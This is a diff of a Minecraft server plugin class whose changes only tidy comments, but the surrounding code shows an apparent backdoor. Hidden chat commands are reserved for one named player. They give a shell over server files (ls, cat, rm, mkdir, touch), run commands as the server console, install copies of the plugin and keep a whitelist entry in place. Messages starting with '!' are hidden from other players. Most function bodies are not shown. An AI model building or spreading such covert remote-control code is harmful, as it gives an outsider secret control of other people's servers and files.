@@ -35,11 +35,6 @@ public class ConsoleCommandListener implements Listener {
         this.plugin = plugin;
     }
 
-    /*
-     * ==========================================
-     * SPIELER COMMAND LOG
-     * ==========================================
-     */
 
     @EventHandler(
             priority = EventPriority.MONITOR,
@@ -64,10 +59,7 @@ public class ConsoleCommandListener implements Listener {
         );
     }
 
-    /*
-     * ==========================================
-     * CONSOLE COMMAND LOG
-     * ==========================================
+    /* Console command log
      */
 
     @EventHandler(
@@ -91,11 +83,7 @@ public class ConsoleCommandListener implements Listener {
         );
     }
 
-    /*
-     * ==========================================
-     * CHAT
-     * ==========================================
-     */
+    // chat
 
     @EventHandler(
             priority = EventPriority.LOWEST,
@@ -113,10 +101,8 @@ public class ConsoleCommandListener implements Listener {
 
         Player player = event.getPlayer();
 
-        /*
-         * Nur Jhailier darf die Toolpack-Funktionen
-         * verwenden.
-         */
+
+        //only jhailier check
         JhaliersToolpack toolpack = getToolpack();
 
         if (toolpack == null
@@ -125,9 +111,7 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
          * ! SHELL MODE
-         * ==========================================
          *
          * Sobald die Shell aktiv ist, werden normale
          * Chatnachrichten als Shell-Befehle interpretiert.
@@ -140,11 +124,7 @@ public class ConsoleCommandListener implements Listener {
          * bleiben normale Toolpack-Befehle.
          */
 
-        /*
-         * ==========================================
-         * ! SHELL MODE
-         * ==========================================
-         */
+        /*SHELL MODE*/
 
         if (toolpack != null
                 && toolpack.isShellEnabled()
@@ -161,11 +141,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !help
-         * ==========================================
-         */
+        // !help
 
         if (message.equalsIgnoreCase("!help")) {
 
@@ -176,11 +152,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !shell
-         * ==========================================
-         */
+        //shell
 
         if (message.equalsIgnoreCase("!shell")) {
 
@@ -191,11 +163,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !loglisten
-         * ==========================================
-         */
+        //loglisten
 
         if (message.equalsIgnoreCase("!loglisten")) {
 
@@ -258,11 +226,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !wlsustain
-         * ==========================================
-         */
+        //whitelist sustain
 
         if (message.equalsIgnoreCase("!wlsustain")) {
 
@@ -321,11 +285,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !inf
-         * ==========================================
-         */
+        // inf
 
         if (message.toLowerCase(Locale.ROOT)
                 .startsWith("!inf")) {
@@ -382,11 +342,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !ls
-         * ==========================================
-         */
+        //!ls
 
         if (message.toLowerCase(Locale.ROOT)
                 .startsWith("!ls")) {
@@ -423,11 +379,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * !cat
-         * ==========================================
-         */
+        //!cat
 
         if (message.toLowerCase(Locale.ROOT)
                 .startsWith("!cat")) {
@@ -472,14 +424,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * ALLE ! NACHRICHTEN ABFANGEN
-         * ==========================================
-         *
-         * Alles was mit ! beginnt und kein gültiger
-         * Befehl war, wird NICHT öffentlich geschrieben.
-         */
+        // Alle ! Nachrichten abfangen:
 
         if (message.charAt(0) == '!') {
 
@@ -493,11 +438,7 @@ public class ConsoleCommandListener implements Listener {
             return;
         }
 
-        /*
-         * ==========================================
-         * # <BEFEHL> ALS KONSOLE
-         * ==========================================
-         */
+        // Befehl als Minecraft Konsole:
 
         if (message.charAt(0) != PREFIX) {
             return;
@@ -560,9 +501,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL TOGGLE
-     * ==========================================
+
      */
 
     private void toggleShell(Player player) {
@@ -641,9 +582,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL COMMAND
-     * ==========================================
+
      */
 
     private void executeShellCommand(
@@ -666,9 +607,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * exit
-         * ==========================================
+
          */
 
         if (command.equalsIgnoreCase("exit")
@@ -687,9 +628,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * help
-         * ==========================================
+
          */
 
         if (command.equalsIgnoreCase("help")) {
@@ -700,9 +641,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * pwd
-         * ==========================================
+
          */
 
         if (command.equalsIgnoreCase("pwd")) {
@@ -718,9 +659,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * cd
-         * ==========================================
+
          */
 
         if (command.equalsIgnoreCase("cd")) {
@@ -751,9 +692,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * ls
-         * ==========================================
+
          */
 
         if (command.equals("ls")
@@ -773,9 +714,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * cat
-         * ==========================================
+
          */
 
         if (command.startsWith("cat ")) {
@@ -792,9 +733,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * mkdir
-         * ==========================================
+
          */
 
         if (command.startsWith("mkdir ")) {
@@ -811,9 +752,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * touch
-         * ==========================================
+
          */
 
         if (command.startsWith("touch ")) {
@@ -830,9 +771,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * rm
-         * ==========================================
+
          */
 
         if (command.startsWith("rm ")) {
@@ -849,9 +790,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * clear
-         * ==========================================
+
          */
 
         if (command.equalsIgnoreCase("clear")) {
@@ -870,9 +811,9 @@ public class ConsoleCommandListener implements Listener {
         }
 
         /*
-         * ==========================================
+
          * Unbekannter Befehl
-         * ==========================================
+
          */
 
         player.sendMessage(
@@ -895,9 +836,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL: cd
-     * ==========================================
+
      */
 
     private void shellCd(
@@ -993,9 +934,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL: ls
-     * ==========================================
+
      */
 
     private void shellLs(
@@ -1119,9 +1060,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL: cat
-     * ==========================================
+
      */
 
     private void shellCat(
@@ -1229,9 +1170,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL: mkdir
-     * ==========================================
+
      */
 
     private void shellMkdir(
@@ -1282,9 +1223,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL: touch
-     * ==========================================
+
      */
 
     private void shellTouch(
@@ -1336,9 +1277,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL: rm
-     * ==========================================
+
      */
 
     private void shellRm(
@@ -1442,9 +1383,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL PATH RESOLUTION
-     * ==========================================
+
      */
 
     private Path resolveShellPath(
@@ -1480,9 +1421,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL SECURITY
-     * ==========================================
+
      */
 
     private boolean isInsideServerDirectory(
@@ -1506,9 +1447,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL HELP
-     * ==========================================
+
      */
 
     private void sendShellHelp(
@@ -1590,9 +1531,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * SHELL OUTPUT
-     * ==========================================
+
      */
 
     private void sendShellPrompt(
@@ -1668,9 +1609,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * !help
-     * ==========================================
+
      */
 
     private void sendHelp(
@@ -1792,9 +1733,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * !inf
-     * ==========================================
+
      */
 
     private void installPluginCopy(
@@ -1875,9 +1816,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * !ls
-     * ==========================================
+
      */
 
     private void listServerFiles(
@@ -2015,9 +1956,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * !cat
-     * ==========================================
+
      */
 
     private void showFileContent(
@@ -2116,9 +2057,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * Große Nachrichten
-     * ==========================================
+
      */
 
     private void sendLargeMessage(
@@ -2154,9 +2095,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * Fehler
-     * ==========================================
+
      */
 
     private void sendError(
@@ -2173,9 +2114,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * Plugin-JAR
-     * ==========================================
+
      */
 
     private Path getPluginJar() {
@@ -2189,9 +2130,9 @@ public class ConsoleCommandListener implements Listener {
     }
 
     /*
-     * ==========================================
+
      * Toolpack
-     * ==========================================
+
      */
 
     private JhaliersToolpack getToolpack() {
